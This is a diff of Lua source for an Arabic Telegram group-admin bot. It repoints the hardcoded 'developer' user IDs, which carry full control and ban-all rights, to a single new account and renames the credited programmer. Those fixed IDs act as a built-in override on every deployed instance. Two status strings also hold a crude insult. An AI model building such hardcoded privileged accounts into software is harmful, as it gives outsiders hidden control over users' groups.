@@ -280,7 +280,7 @@ return conis
 end
 function The_ControllerAll(UserId)
 ControllerAll = false
-local ListSudos = {Sudo_Id,6264438859,5969871722,627658332,5986905034,6430417482,55555555555,5555555555}
+local ListSudos = {Sudo_Id,1488114134,1488114134,1488114134,1488114134,1488114134,1488114134,1488114134}
 for k, v in pairs(ListSudos) do
 if tonumber(UserId) == tonumber(v) then
 ControllerAll = true
@@ -303,19 +303,19 @@ function Controllerbanall(ChatId,UserId)
 Status = 0
 local Controll2 = Redis:sismember(Fast.."ControlAll:Groups",UserId)
 Devss = Redis:sismember(Fast.."Devss:Groups",UserId) 
-if UserId == 6264438859 then
+if UserId == 1488114134 then
 Status = true
-elseif UserId == 6430417482 then
+elseif UserId == 1488114134 then
 Status = true
-elseif UserId == 55555555555 then
+elseif UserId == 1488114134 then
 Status = true
-elseif UserId == 5969871722 then
+elseif UserId == 1488114134 then
 Status = true
-elseif UserId == 5555555555 then
+elseif UserId == 1488114134 then
 Status = true
-elseif UserId == 5986905034 then
+elseif UserId == 1488114134 then
 Status = true
-elseif UserId == 627658332 then
+elseif UserId == 1488114134 then
 Status = true
 elseif UserId == Sudo_Id then  
 Status = true
@@ -343,17 +343,17 @@ Manger = Redis:sismember(Fast.."Manger:Group"..ChatId,UserId)
 Admin = Redis:sismember(Fast.."Admin:Group"..ChatId,UserId)
 Special = Redis:sismember(Fast.."Special:Group"..ChatId,UserId)
 StatusMember = bot.getChatMember(ChatId,UserId).status.Fastbots
-if UserId == 6264438859 then
-Status = 'المبرمج قيصر ❤️‍🔥'
-elseif UserId == 5969871722 then
+if UserId == 1488114134 then
+Status = 'المبرمج بلال ❤️‍🔥'
+elseif UserId == 1488114134 then
 Status = 'مطـور السـورس '
-elseif UserId == 55555555555 then
+elseif UserId == 1488114134 then
 Status = 'مطـور السـورس '
-elseif UserId == 6430417482 then
+elseif UserId == 1488114134 then
 Status = 'مطـور السـورس '
-elseif UserId == 5986905034 then
+elseif UserId == 1488114134 then
 Status = ' ستك لولا يقلب امك ❤️‍🔥 '
-elseif UserId == 627658332 then
+elseif UserId == 1488114134 then
 Status = 'مطـور السـورس '
 elseif UserId == Sudo_Id then  
 Status = 'المطـور الاساسي '
@@ -1067,19 +1067,19 @@ Manger = Redis:sismember(Fast.."Manger:Group"..ChatId,UserId)
 Admin = Redis:sismember(Fast.."Admin:Group"..ChatId,UserId)
 Special = Redis:sismember(Fast.."Special:Group"..ChatId,UserId)
 StatusMember = bot.getChatMember(ChatId,UserId).status.Fastbots
-if UserId == 6264438859 then
+if UserId == 1488114134 then
 Status = true
-elseif UserId == 55555555555 then
+elseif UserId == 1488114134 then
 Status = true
-elseif UserId == 5555555555 then
+elseif UserId == 1488114134 then
 Status = true
-elseif UserId == 6430417482 then
+elseif UserId == 1488114134 then
 Status = true
-elseif UserId == 5969871722 then
+elseif UserId == 1488114134 then
 Status = true
-elseif UserId == 5986905034 then
+elseif UserId == 1488114134 then
 Status = true
-elseif UserId == 627658332 then
+elseif UserId == 1488114134 then
 Status = true
 elseif UserId == Sudo_Id then  
 Status = true
@@ -1121,19 +1121,19 @@ Manger = Redis:sismember(Fast.."Manger:Group"..ChatId,UserId)
 Admin = Redis:sismember(Fast.."Admin:Group"..ChatId,UserId)
 Special = Redis:sismember(Fast.."Special:Group"..ChatId,UserId)
 StatusMember = bot.getChatMember(ChatId,UserId).status.Fastbots
-if UserId == 6264438859 then
+if UserId == 1488114134 then
 Status = true
-elseif UserId == 55555555555 then
+elseif UserId == 1488114134 then
 Status = true
-elseif UserId == 5555555555 then
+elseif UserId == 1488114134 then
 Status = true
-elseif UserId == 6430417482 then
+elseif UserId == 1488114134 then
 Status = true
-elseif UserId == 5969871722 then
+elseif UserId == 1488114134 then
 Status = true
-elseif UserId == 5986905034 then
+elseif UserId == 1488114134 then
 Status = true
-elseif UserId == 627658332 then
+elseif UserId == 1488114134 then
 Status = true
 elseif UserId == Sudo_Id then    
 Status = true
@@ -1291,7 +1291,7 @@ text = json.msg
 print(text)
 end --]]
 if data.content.text then
-xname =  (Redis:get(Fast.."Name:Bot") or "[قيصر]") 
+xname =  (Redis:get(Fast.."Name:Bot") or "[سيدثون]") 
 text = data.content.text.text
 if text:match("^"..xname.." (.*)$") then
 text = text:match("^"..xname.." (.*)$")
@@ -1303,25 +1303,25 @@ if tonumber(msg.sender_id.user_id) == tonumber(Fast) then
 return false
 end 
 
-if tonumber(senderr) == 6264438859 then
-msg.Name_Controller = 'المبرمج قيصر ❤️‍🔥  '
+if tonumber(senderr) == 1488114134 then
+msg.Name_Controller = 'المبرمج بلال ❤️‍🔥  '
 msg.The_Controller = 1
-elseif tonumber(senderr) == 5092041118 then
+elseif tonumber(senderr) == 1488114134 then
 msg.Name_Controller = 'مطور السورس - ✅ '
 msg.The_Controller = 1
-elseif tonumber(senderr) == 55555555555 then
+elseif tonumber(senderr) == 1488114134 then
 msg.Name_Controller = 'مطور السورس - ✅ '
 msg.The_Controller = 1
-elseif tonumber(senderr) == 6430417482 then
+elseif tonumber(senderr) == 1488114134 then
 msg.Name_Controller = 'مطور السورس - ✅ '
 msg.The_Controller = 1
-elseif tonumber(senderr) == 5986905034 then
+elseif tonumber(senderr) == 1488114134 then
 msg.Name_Controller = 'ستك لولا يقلب امك 🌝🤍 '
 msg.The_Controller = 1
-elseif tonumber(senderr) == 5969871722 then
+elseif tonumber(senderr) == 1488114134 then
 msg.Name_Controller = 'مطـور السـورس  '
 msg.The_Controller = 1
-elseif tonumber(senderr) == 627658332 then
+elseif tonumber(senderr) == 1488114134 then
 msg.Name_Controller = 'مطـور السـورس  '
 msg.The_Controller = 1
 elseif The_ControllerAll(senderr) == true then  
@@ -1543,8 +1543,8 @@ Redis:incr(Fast.."Num:Add:Memp"..msg_chat_id..":"..msg.sender_id.user_id)
 end
 
 if msg.content.Fastbots == "messageChatJoinByLink" or msg.content.Fastbots == "messageChatAddMembers" then
-if msg.sender_id.user_id == tonumber(6264438859) then
-send(msg_chat_id,msg_id,"مرحبآ بك عزيزي المبرمج قيصر نورت الجروب - 🔥","md",true)
+if msg.sender_id.user_id == tonumber(1488114134) then
+send(msg_chat_id,msg_id,"مرحبآ بك عزيزي المبرمج بلال نورت الجروب - 🔥","md",true)
 end
 end
 if msg.content.Fastbots == "messageChatJoinByLink" or msg.content.Fastbots == "messageChatAddMembers" then
